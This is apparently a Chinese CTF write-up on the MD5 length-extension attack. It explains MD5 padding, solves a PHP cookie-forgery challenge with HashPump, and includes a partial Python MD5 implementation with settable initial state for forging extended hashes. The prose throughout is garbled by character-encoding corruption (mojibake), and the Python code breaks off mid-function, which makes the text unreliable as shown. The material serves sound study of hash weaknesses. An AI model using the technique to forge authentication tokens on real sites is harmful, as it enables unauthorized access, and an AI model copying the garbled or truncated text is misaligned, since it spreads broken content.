md5æ˜¯å¯¹ä¸€æ®µä¿¡æ¯ï¼ˆMessageï¼‰äº§ç”Ÿä¿¡æ¯æ‘˜è¦ï¼ˆMessage-Digestï¼‰ï¼Œæ‰€è°“ä¿¡æ¯å°±æ˜¯æŒ‡æˆ‘ä»¬éœ€è¦åŠ å¯†çš„åŸæ•°æ®ï¼Œä¿¡æ¯æ‘˜è¦æ˜¯æ•°æ®ç»è¿‡ä¸€ç³»åˆ—è®¡ç®—å¾—å‡ºæ¥çš„ä¸€ä¸ªé•¿åº¦å›ºå®šçš„æ•°æ®ï¼ˆå¯ä»¥è¯´æ˜¯æºæ•°æ®çš„ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„æŒ‡çº¹ï¼‰ã€‚ 3.3.2 è®¡ç®—æ­¥éª¤ MD5ä»¥512ä½åˆ†ç»„æ¥å¤„ç†è¾“å…¥çš„ä¿¡æ¯ï¼Œä¸”æ¯ä¸€åˆ†ç»„åˆè¢«åˆ’åˆ†ä¸º16ä¸ª32ä½å­åˆ†ç»„ï¼Œç»è¿‡äº†ä¸€ç³»åˆ—çš„å¤„ç†åï¼Œç®—æ³•çš„è¾“å‡ºç”±å››ä¸ª32ä½åˆ†ç»„ç»„æˆï¼Œå°†è¿™å››ä¸ª32ä½åˆ†ç»„çº§è”åå°†ç”Ÿæˆä¸€ä¸ª128ä½æ•£åˆ—å€¼ã€‚ ç¬¬ä¸€æ­¥ã€å¡«å…… å¦‚æœè¾“å…¥ä¿¡æ¯çš„é•¿åº¦(bit)å¯¹512æ±‚ä½™çš„ç»“æœä¸ç­‰äº448ï¼Œå°±éœ€è¦å¡«å……ä½¿å¾—å¯¹512æ±‚ä½™çš„ç»“æœç­‰äº448ã€‚å¡«å……çš„æ–¹æ³•æ˜¯å¡«å……ä¸€ä¸ª1å’Œnä¸ª0ã€‚å¡«å……å®Œåï¼Œä¿¡æ¯çš„é•¿åº¦å°±ä¸ºN*512+448(bit)ï¼› ç¬¬äºŒæ­¥ã€è®°å½•ä¿¡æ¯é•¿åº¦ ç”¨64ä½æ¥å­˜å‚¨å¡«å……å‰ä¿¡æ¯é•¿åº¦ã€‚è¿™64ä½åŠ åœ¨ç¬¬ä¸€æ­¥ç»“æœçš„åé¢ï¼Œè¿™æ ·ä¿¡æ¯é•¿åº¦å°±å˜ä¸ºN*512+448+64=(N+1)*512ä½ã€‚ ç¬¬ä¸‰æ­¥ã€è£…å…¥æ ‡å‡†çš„å¹»æ•°ï¼ˆå››ä¸ªæ•´æ•°ï¼‰ æ ‡å‡†çš„å¹»æ•°ï¼ˆç‰©ç†é¡ºåºï¼‰æ˜¯ ï¼ˆA=(01234567)16ï¼ŒB=(89ABCDEF)16ï¼ŒC=(FEDCBA98)16ï¼ŒD=(76543210)16ï¼‰ã€‚å¦‚æœåœ¨ç¨‹åºä¸­å®šä¹‰åº”è¯¥æ˜¯ï¼ˆA=0X67452301Lï¼ŒB=0XEFCDAB89Lï¼ŒC=0X98BADCFELï¼ŒD=0X10325476Lï¼‰ æ ‡å‡†çš„åˆå¹»æ•°æ˜¯Md5ç®—æ³•å›ºå®šçš„ï¼Œä¸ä¼šå˜åŒ–ï¼Œä½†æ˜¯å¹»æ•°æœ¬èº«æ˜¯éšç€æ¯ä¸€è½®è®¡ç®—ä¸æ–­å˜åŠ¨çš„ã€‚ ç¬¬å››æ­¥ã€å››è½®å¾ªç¯è¿ç®— å¤æ‚è¿ç®—ï¼Œå…·ä½“è®¡ç®—æ–¹æ³•å¯ä»¥googleä¸€ä¸‹ä»£ç ã€‚ 3.2.3 è®¡ç®—çš„ä¾‹å­ æ¯”å¦‚è®¡ç®—å­—ç¬¦ä¸²testçš„md5å€¼ã€‚ åå…­è¿›åˆ¶0x74657374 äºŒè¿›åˆ¶0b1110100011001010111001101110100 è¿™é‡Œåå…­è¿›åˆ¶ä¸448æ¨¡512ä¸åŒä½™ï¼Œéœ€è¡¥ä½æ»¡è¶³äºŒè¿›åˆ¶é•¿åº¦ä½512çš„å€æ•°ï¼Œè¡¥ä½åçš„æ•°æ®å¦‚ä¸‹ï¼š åå…­è¿›åˆ¶ï¼š 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 è¿™é‡Œåé¢è¡¥å……8æ˜¯å› ä¸ºï¼šè¡¥ä½æ—¶äºŒè¿›åˆ¶ç¬¬ä¸€ä½è¦è¡¥1ï¼Œé‚£ä¹ˆ1000è½¬æ¢æˆ16è¿›åˆ¶å°±æ˜¯8ï¼Œåé¢éƒ½è¡¥ä¸Š0 ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºä¸€å…±æ˜¯128ä¸ªå­—ç¬¦ï¼Œåå…­è¿›åˆ¶æ¯ä¸ªå­—ç¬¦èƒ½å¤Ÿè½¬æ¢æˆ4ä½äºŒè¿›åˆ¶ï¼Œ128*4=512è¿™å°±æ˜¯ä¸€ç»„ï¼Œæ­£å¥½æ˜¯512bitã€‚ å¹¶ä¸”å¯ä»¥çœ‹åˆ°ä¸Šè¿°æœ€åäºŒåä¸ªå­—ç¬¦æ˜¯ä»¥20å¼€å¤´çš„ï¼Œè¿™æˆ–è®¸æ˜¯ç”±äºæˆ‘ä»¬md5é‡‡ç”¨32ä½åŠ å¯†ï¼Œæ•…testä¸º4*8=32ï¼Œè€Œ32çš„åå…­è¿›åˆ¶å°±æ˜¯20 å³ï¼šæœ€åå››å­—èŠ‚ä¹Ÿå°±æ˜¯2000000000000000ä»£è¡¨å‰é¢â€™testâ€™çš„é•¿åº¦ äºŒè¿›åˆ¶ï¼š 0b1110100011001010111001101110100100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000 å°†è¡¥ä½åçš„æ•°æ®è¿›è¡Œä¸€æ¬¡å¤æ‚çš„è¿ç®—ï¼Œè®¡ç®—å‡º A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 æ•°æ®å°äº512ä½ï¼Œæ‰€ä»¥å°†ABCDé€šè¿‡å°ç«¯è§„åˆ™è½¬æ¢å°±æ˜¯MD5å€¼ï¼š098f6bcd4621d373cade4e832627b4f6 å°ç«¯è§„åˆ™ï¼š æ•°æ®çš„é«˜ä½å­—èŠ‚å­˜æ”¾åœ¨åœ°å€çš„é«˜ç«¯ ä½ä½å­—èŠ‚å­˜æ”¾åœ¨åœ°å€ä½ç«¯ï¼Œæ¯”å¦‚åå…­è¿›åˆ¶çš„å16ä½ï¼ˆ64/4ï¼‰æ˜¯32ï¼Œè¡¨ç¤ºä¿¡æ¯é•¿åº¦æ˜¯32ä½ï¼Œå°±æ˜¯2000000000000000ï¼› å¦‚æœæˆ‘è¾“å…¥çš„æ•°æ®ä¸æ˜¯testè€Œæ˜¯ä¸€ä¸²å¾ˆé•¿çš„å­—ç¬¦ï¼Œæ¢ç®—å‡ºæ¥å¤§äº512å°äº1024ï¼Œå°±éœ€è¦è®¡ç®—ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡å…ˆè®¡ç®—å‰512ä½çš„ABCDçš„å€¼ï¼Œç®—å‡ºæ¥åå†ç”¨è¿™ä¸ªABCDå»è®¡ç®—åé¢512ä½çš„çš„ABCDçš„å€¼ï¼Œæœ€åç®—å‡ºæ¥çš„ABCDç»è¿‡æ‹¼æ¥å°±æ˜¯è¿™ä¸²å­—ç¬¦çš„MD5äº† è¿™é‡Œè¿˜æ˜¯æœ‰ç‚¹æ‡µé€¼çš„ï¼Œäºæ˜¯ç›´æ¥çœ‹é¢˜ç›®æ¥æ„Ÿå—å§ã€‚ 0x04 md5çš„hashæ‰©å±•æ”»å‡» 4.1 è§£å†³çš„é—®é¢˜ å¦‚æ–‡ç« æœ€åˆé‡åˆ°çš„é—®é¢˜ï¼Œç”±ä¸¤ä¸ªå­—ç¬¦ä¸²ç»„æˆä¸€ä¸ªå­—ç¬¦ä¸²$str=$a+$bï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²$aä¸çŸ¥é“ä¹Ÿä¸å¯æ§ï¼Œåªå¯æ§ç¬¬äºŒä¸ªå­—ç¬¦ä¸²$bï¼ŒåŒæ—¶çŸ¥é“ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²$açš„MD5å€¼å’Œé•¿åº¦ï¼Œè¿™æ—¶å€™å°†ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ç²¾å¿ƒæ„é€ ä¸€ä¸‹ï¼Œä¾¿å¯ä»¥ç®—å‡ºåˆæˆçš„å­—ç¬¦ä¸²$strçš„MD5çš„å€¼ 4.2 æ”»å‡»åŸç† è¦æ˜ç™½æ”»å‡»çš„åŸç†ï¼Œéœ€è¦å¯¹md5è®¡ç®—æ–¹æ³•ç¨å¾®äº†è§£ä¸€ä¸‹ï¼Œå°±æ˜¯ä¸Šè¾¹çš„å‡ ä¸ªæ­¥éª¤ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ä»¥ä¸Šé—®é¢˜æ­£å¸¸è®¡ç®—çš„æ­¥éª¤ã€‚ 4.2.1 æ­£å¸¸çš„è®¡ç®—æ­¥éª¤ å‡å¦‚ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²$a=â€œtestâ€,ä¸ºäº†æ–¹ä¾¿è½¬ä¸ºåå…­è¿›åˆ¶0x74657374 æ„é€ ç¬¬äºŒä¸ªå­—ç¬¦ä¸²é¦–å…ˆæ‰‹åŠ¨å°†$strè¡¥æˆä¸€ä¸ªæ ‡å‡†çš„å¯ä»¥ç›´æ¥è®¡ç®—çš„512ä½ $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 è¿™æ ·å­ï¼Œè¿™æ—¶å€™å†åœ¨åé¢è¿½åŠ ä¸€ä¸ª0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 è¿™æ—¶å€™å†å°†$strå¤§äº512ä½ï¼Œç¨‹åºä¼šå…ˆå°†è¿™ä¸²æ•°æ®è¡¥ä¸º1024ä½ï¼Œè¡¥å……å®Œå¦‚ä¸‹ $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 è¿™æ—¶å°†$stråˆ†ä¸ºä¸¤éƒ¨åˆ† 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 å’Œ 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 è¿™æ—¶å€™ç¨‹åºè®¡ç®—å‰ä¸€éƒ¨åˆ†çš„ABCDçš„å€¼ï¼Œç”±äºå’Œä¹‹å‰ç®—çš„testçš„æ•°å€¼æ˜¯ç›¸åŒçš„æ‰€ä»¥ A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 åˆ°äº†ç¬¬äºŒéƒ¨åˆ†ï¼Œç¬¬äºŒéƒ¨åˆ†çš„è®¡ç®—æ˜¯ç”¨çš„ç¬¬ä¸€éƒ¨åˆ†çš„ABCDå»è®¡ç®—ï¼Œè®¡ç®—æ–°çš„ABCDå¦‚ä¸‹ A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 æœ€åç®—å‡ºæ¥çš„MD5æ˜¯e5596322eb12df999ef55368856340f5 4.2.2 å‘ç°é—®é¢˜ æˆ‘ä»¬çœ‹åˆ°äº†ï¼Œå°†åŸæ•°æ®æŒ‰é•¿åº¦æ‹†åˆ†åï¼Œç¬¬ä¸€è½®è®¡ç®—çš„ç»“æœä¼šä½œä¸ºå¹»æ•°ç”¨åœ¨ç¬¬äºŒè½®è®¡ç®—ä¸­ã€‚è€Œåœ¨æˆ‘ä»¬çš„é—®é¢˜ä¸­ï¼Œç¬¬ä¸€è½®è®¡ç®—çš„ç»“æœæˆ‘ä»¬æ˜¯å·²çŸ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çŸ¥é“äº†ç¬¬äºŒè½®è®¡ç®—çš„å¹»æ•°ï¼Œå¯ä»¥è¿›è¡Œæ¥ä¸‹æ¥çš„è¿ç®—ã€‚ å› ä¸ºçŸ¥é“äº†ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²$açš„é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ç¬¬äºŒä¸ªå­—ç¬¦ä¸²$bçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ‰‹åŠ¨åœ¨ç¬¬äºŒä¸ªå­—ç¬¦ä¸²$bçš„å‰ç«¯æ·»åŠ ä¸€äº›ç‰¹å®šæ•°æ®ï¼Œä½¿å¾—ç¬¬ä¸€è½®è®¡ç®—å› ä¸ºæˆ‘ä»¬æ·»åŠ æ•°æ®åç¬¦åˆä¸€è½®è®¡ç®—çš„åŸæ•°æ®é•¿åº¦è€Œåªè®¡ç®—å‡ºç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„hashå€¼ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç»“æœä½œä¸ºæˆ‘ä»¬äºŒè½®è®¡ç®—çš„å¹»æ•°è¿›è¡Œä¸‹é¢çš„è®¡ç®—ï¼Œä»è€Œé¢„æµ‹æœ€ç»ˆçš„mdç»“æœã€‚ å…·ä½“çš„æ“ä½œæ­¥éª¤çœ‹ä¸€ä¸‹ä¾‹å­ã€‚ æˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…æ¥å¤ç°ä¸€ä¸‹åˆšæ‰æ­£å¸¸è®¡ç®—çš„é‚£ä¸ªè¿‡ç¨‹ã€‚ çŸ¥é“çš„æ¡ä»¶ 1.$açš„MD5(098f6bcd4621d373cade4e832627b4f6) 2.$açš„é•¿åº¦=4 3.$bæˆ‘ä»¬å¯ä»¥ä»»æ„æ§åˆ¶ ç”±1æˆ‘ä»¬å¯ä»¥é€†æ¨ç®—å‡ºå…¶ABCDçš„å€¼ A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 æˆ‘ä»¬æ„é€ $bçš„å€¼ï¼Œåœ¨å‰é¢æ·»åŠ ç‰¹å®šé•¿åº¦çš„è¡¥å…¨å€¼ï¼š $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' å…¶ä¸­\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00è¿™ä¸€ç±»çš„æ•°æ®æ˜¯åœ¨md5è®¡ç®—çš„è¡¥ä½è¿‡ç¨‹ä¸­å¡«å……çš„æ•°æ®ï¼Œæˆ‘ä»¬æ‰‹åŠ¨æ¥å¡«å……ä¸€ä¸‹ï¼Œé•¿åº¦è§†å·²çŸ¥çš„$açš„é•¿åº¦=4å†³å®šã€‚ æ­¤æ—¶$strå¦‚ä¸‹ï¼Œç”±äºä¸çŸ¥é“$aï¼Œæˆ‘ä»¬å‡è®¾$a=â€œaaaaâ€ $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' è®¡ç®—strçš„è¿‡ç¨‹ 1.ç”±äºå¤§äº512ä½ï¼Œå…ˆè¡¥å…¨ä¸º1024ä½ï¼Œ 2.å°†å…¶åˆ†ä¸ºä¸¤éƒ¨åˆ† 3.è®¡ç®—ç¬¬ä¸€éƒ¨åˆ†çš„ABCDçš„å€¼ 4.å†ç”¨ç¬¬ä¸€éƒ¨åˆ†ç®—å‡ºæ¥çš„ABCDæ‹¿æ¥ç®—ç¬¬äºŒéƒ¨åˆ†çš„å€¼ã€‚ è¿™é‡Œç”±äºç¬¬ä¸€éƒ¨åˆ†çš„ABCDæˆ‘ä»¬å¯ä»¥é€†æ¨å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·³è¿‡å‰ä¸‰éƒ¨åˆ†ç›´æ¥è¿›è¡Œç¬¬å››éƒ¨åˆ†çš„è®¡ç®—ï¼Œåªéœ€è¦å°†æ ‡å‡†çš„MD5çš„æºç é‡Œé¢çš„åˆå§‹çš„ABCDçš„å€¼æ”¹ä¸ºé€†æ¨å‡ºæ¥çš„é‚£ä¸ªå€¼ æˆ‘ä»¬ç”¨å‡çš„åˆå§‹çš„ABCDè®¡ç®—ä¸€ä¸‹ 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 å¾—åˆ°MD5ï¼Œå‘ç°æ˜¯e5596322eb12df999ef55368856340f5ï¼Œå’Œä¸Šé¢æ­£å‘è®¡ç®—å‡ºæ¥çš„ä¸€æ ·ï¼ åˆ°æ­¤ï¼Œmd5çš„hashæ‰©å±•æ”»å‡»ç»“æŸã€‚ 0x05 CTFå®ä¾‹ è¿™é‡Œä¹Ÿæ‡’å¾—æ‰¾ç¯å¢ƒäº†ï¼Œå°±ç›´æ¥çœ‹ç€ä»£ç åˆ†æå§ &lt;?php $flag = \"flag{flag is here}\"; $secret = \"aaaaabbbbbccccc\"; // This secret is 15 characters long for security! @$username = $_POST[\"username\"]; @$password = $_POST[\"password\"]; if (!empty($_COOKIE[\"getmein\"])) { if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") { if ($_COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) { echo \"Congratulations! You are a registered user. \"; die (\"The flag is \". $flag); } else { die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); } } else { die (\"You are not an admin! LEAVE.\"); } } setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[\"source\"])) { setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[\"source\"] != 0) { echo \"\"; // This source code is outputted here } } ?&gt; é€šè¿‡é˜…è¯»æºç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¦‚æœæƒ³è¦å¾—åˆ°flagï¼Œéœ€è¦å‡ ä¸ªæ¡ä»¶ï¼š cookeiå­—æ®µçš„getmeinä¸èƒ½ä¸ºç©º å‘é€è¿‡å»çš„username = adminï¼Œå¹¶ä¸”ï¼Œpassword != admin getmeinçš„å€¼ = $secret + $username + $password çš„md5å€¼ å‰ä¸¤ä¸ªæ¡ä»¶éƒ½å¾ˆå®¹æ˜“æ»¡è¶³ï¼Œå…³é”®æ˜¯ç¬¬ä¸‰ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“$secretçš„å†…å®¹ï¼ŒåªçŸ¥é“é•¿åº¦ä¸º15ï¼Œä¸è¿‡ç»§ç»­é˜…è¯»åé¢çš„å†…å®¹ï¼Œå¯ä»¥è·å¾—ä¸€ä¸ªä¿¡æ¯æ˜¯ï¼š md5($secret + adminadmin)å·²çŸ¥ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚å¤´ä¸­çš„sample-hash é‚£ä¹ˆï¼Œ å¦‚æœ $username = adminï¼Œ$password = adminwnï¼Œåˆ™é—®é¢˜åˆ™è½¬åŒ–æˆï¼š å·²çŸ¥md5(â€˜xxxxxxxxxxxxxxxadminadminâ€™)ï¼Œæ±‚md5(â€˜xxxxxxxxxxxxxxxadminadminwnâ€™)çš„å€¼ï¼Œç„¶ååªè¦æŠŠè¯¥å€¼èµ‹ç»™getmeinå³å¯ã€‚ç»¼ä¸Šï¼Œå¯ä»¥åˆ©ç”¨md5æ‰©å±•é•¿åº¦æ”»å‡»ã€‚ ç”±äºmd5ç®—æ³•è¾ƒä¸ºå¤æ‚ï¼Œæˆ‘ä½¿ç”¨äº†ä¸€ä¸ªå·¥å…·hashpumpï¼š é™„ä¸Šå®‰è£…æ–¹æ³•ï¼š git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install ç”¨æ³•ï¼š è¾“å…¥å·²çŸ¥çš„å­—ç¬¦ä¸²å’Œmd5ç»“æœï¼ˆåœ¨è¿™é‡Œæ˜¯adminadminå’Œ571580b26c65f306376d4f64e53cb5c7ï¼‰ï¼Œè¾“å…¥å¯†é’¥çš„é•¿åº¦ï¼ˆ15)ï¼Œå†è¾“å…¥ä½ æƒ³è¦åœ¨åé¢æ·»åŠ çš„å­—ç¬¦ä¸²ï¼Œå®ƒä¼šè‡ªåŠ¨ç»™ä½ è¿”å›md5åçš„ç»“æœï¼Œä»¥åŠå¡«å……æ•°æ®ï¼š æŠŠæ•°æ®åœ¨burpsuiteä¸­å¡«å…¥åé‡å‘å³å¯å¾—åˆ°flagã€‚ 0x06 ä»£ç å®ç° è¿™é‡Œé™„ä¸Šå®ç°æºç  my_md5.py #!/usr/bin/env python # -*- coding: utf-8 -*- # @Authorï¼šDshtAnger # theory reference: # blogï¼š # http://blog.csdn.net/adidala/article/details/28677393 # http://blog.csdn.net/forgotaboutgirl/article/details/7258109 # http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html # RFC1321ï¼š # https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf ############################################################################## import sys def genMsgLengthDescriptor(msg_bitsLenth): ''' ---args: msg_bitsLenth : the bits length of raw message --return: 16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding ''' return __import__(\"struct\").pack(\"&gt;Q\",msg_bitsLenth).encode(\"hex\") def reverse_hex_8bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 16 , i.e.8bytes --return: transform raw message descriptor to little-endian ''' hex_str = \"%016x\"%int(hex_str,16) assert len(hex_str)==16 return __import__(\"struct\").pack(\"&lt;Q\",int(hex_str,16)).encode(\"hex\") def reverse_hex_4bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 8 , i.e.4bytes --return: transform 4 bytes message block to little-endian ''' hex_str = \"%08x\"%int(hex_str,16) assert len(hex_str)==8 return __import__(\"struct\").pack(\"&lt;L\",int(hex_str,16)).encode(\"hex\") def deal_rawInputMsg(input_msg): ''' --args: input_msg : inputed a ascii-encoded string --return: a hex-encoded string which can be inputed to mathematical transformation function. ''' ascii_list = [x.encode(\"hex\") for x in input_msg] length_msg_bytes = len(ascii_list) length_msg_bits = len(ascii_list)*8 #padding ascii_list.append('80') while (len(ascii_list)*8+64)%512 != 0: ascii_list.append('00') #add Descriptor ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits))) return \"\".join(ascii_list) def getM16(hex_str,operatingBlockNum): ''' --args: hex_str : a hex-encoded string with length in integral multiple of 512bits operatingBlockNum : message block number which is being operated , greater than 1 --return: M : result of splited 64bytes into 4*16 message blocks with little-endian ''' M = [int(reverse_hex_4bytes(hex_str[i:(i+8)]),16) for i in xrange(128*(operatingBlockNum-1),128*operatingBlockNum,8)] return M #å®šä¹‰å‡½æ•°ï¼Œç”¨æ¥äº§ç”Ÿå¸¸æ•°T[i]ï¼Œå¸¸æ•°æœ‰å¯èƒ½è¶…è¿‡32ä½ï¼ŒåŒæ ·éœ€è¦&amp;0xffffffffæ“ä½œã€‚æ³¨æ„è¿”å›çš„æ˜¯åè¿›åˆ¶çš„æ•° def T(i): result = (int(4294967296*abs(__import__(\"math\").sin(i))))&amp;0xffffffff return result #å®šä¹‰æ¯è½®ä¸­ç”¨åˆ°çš„å‡½æ•° #RLä¸ºå¾ªç¯å·¦ç§»ï¼Œæ³¨æ„å·¦ç§»ä¹‹åå¯èƒ½ä¼šè¶…è¿‡32ä½ï¼Œæ‰€ä»¥è¦å’Œ0xffffffffåšä¸è¿ç®—ï¼Œç¡®ä¿ç»“æœä¸º32ä½ F = lambda x,y,z:((x&amp;y)|((~x)&amp;z)) G = lambda x,y,z:((x&amp;z)|(y&amp;(~z))) H = lambda x,y,z:(x^y^z) I = lambda x,y,z:(y^(x|(~z))) RL = L = lambda x,n:(((x&lt;&lt;n)|(x&gt;&gt;(32-n)))&amp;(0xffffffff)) def FF(a, b, c, d, x, s, ac): a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def GG(a, b, c, d, x, s, ac): a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def HH(a, b, c, d, x, s, ac): a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def II(a, b, c, d, x, s, ac): a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def show_md5(A,B,C,D): return \"\".join( [ \"\".join(__import__(\"re\").findall(r\"..\",\"%08x\"%i)[::-1]) for i in (A,B,C,D) ] ) def run_md5(A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476,readyMsg=\"\"): a = A b = B c = C d = D for i in xrange(0,len(readyMsg)/128): M = getM16(readyMsg,i+1) for i in xrange(16): exec \"M\"+str(i)+\"=M[\"+str(i)+\"]\" #First round a=FF(a,b,c,d,M0,7,0xd76aa478L) d=FF(d,a,b,c,M1,12,0xe8c7b756L) c=FF(c,d,a,b,M2,17,0x242070dbL) b=FF(b,c,d,a,M3,22,0xc1bdceeeL) a=FF(a,b,c,d,M4,7,0xf57c0fafL) d=FF(d,a,b,c,M5,12,0x4787c62aL) c=FF(c,d,a,b,M6,17,0xa8304613L) b=FF(b,c,d,a,M7,22,0xfd469501L) a=FF(a,b,c,d,M8,7,0x698098d8L) d=FF(d,a,b,c,M9,12,0x8b44f7afL) c=FF(c,d,a,b,M10,17,0xffff5bb1L) b=FF(b,c,d,a,M11,22,0x895cd7beL) a=FF(a,b,c,d,M12,7,0x6b901122L) d=FF(d,a,b,c,M13,12,0xfd987193L) c=FF(c,d,a,b,M14,17,0xa679438eL) b=FF(b,c,d,a,M15,22,0x49b40821L) #Second round a=GG(a,b,c,d,M1,5,0xf61e2562L) d=GG(d,a,b,c,M6,9,0xc040b340L) c=GG(c,d,a,b,M11,14,0x265e5a51L) b=GG(b,c,d,a,M0,20,0xe9b6c7aaL) a=GG(a,b,c,d,M5,5,0xd62f105dL) d=GG(d,a,b,c,M10,9,0x02441453L) c=GG(c,d,a,b,M15,14,0xd8a1e681L) b=GG(b,c,d,a,M4,20,0xe7d3fbc8L) a=GG(a,b,c,d,M9,5,0x21e1cde6L) d=GG(d,a,b,c,M14,9,0xc33707d6L) c=GG(c,d,a,b,M3,14,0xf4d50d87L) b=GG(b,c,d,a,M8,20,0x455a14edL) a=GG(a,b,c,d,M13,5,0xa9e3e905L) d=GG(d,a,b,c,M2,9,0xfcefa3f8L) c=GG(c,d,a,b,M7,14,0x676f02d9L) b=GG(b,c,d,a,M12,20,0x8d2a4c8aL) #Third round a=HH(a,b,c,d,M5,4,0xfffa3942L) d=HH(d,a,b,c,M8,11,0x8771f681L) c=HH(c,d,a,b,M11,16,0x6d9d6122L) b=HH(b,c,d,a,M14,23,0xfde5380c) a=HH(a,b,c,d,M1,4,0xa4beea44L) d=HH(d,a,b,c,M4,11,0x4bdecfa9L) c=HH(c,d,a,b,M7,16,0xf6bb4b60L) b=HH(b,c,d,a,M10,23,0xbebfbc70L) a=HH(a,b,c,d,M13,4,0x289b7ec6L) d=HH(d,a,b,c,M0,11,0xeaa127faL) c=HH(c,d,a,b,M3,16,0xd4ef3085L) b=HH(b,c,d,a,M6,23,0x04881d05L) a=HH(a,b,c,d,M9,4,0xd9d4d039L) d=HH(d,a,b,c,M12,11,0xe6db99e5L) c=HH(c,d,a,b,M15,16,0x1fa27cf8L) b=HH(b,c,d,a,M2,23,0xc4ac5665L) #Fourth round a=II(a,b,c,d,M0,6,0xf4292244L) d=II(d,a,b,c,M7,10,0x432aff97L) c=II(c,d,a,b,M14,15,0xab9423a7L) b=II(b,c,d,a,M5,21,0xfc93a039L) a=II(a,b,c,d,M12,6,0x655b59c3L) d=II(d,a,b,c,M3,10,0x8f0ccc92L) c=II(c,d,a,b,M10,15,0xffeff47dL) b=II(b,c,d,a,M1,21,0x85845dd1L) a=II(a,b,c,d,M8,6,0x6fa87e4fL) d=II(d,a,b,c,M15,10,0xfe2ce6e0L) c=II(c,d,a,b,M6,15,0xa3014314L) b=II(b,c,d,a,M13,21,0x4e0811a1L) a=II(a,b,c,d,M4,6,0xf7537e82L) d=II(d,a,b,c,M11,10,0xbd3af235L) c=II(c,d,a,b,M2,15,0x2ad7d2bbL) 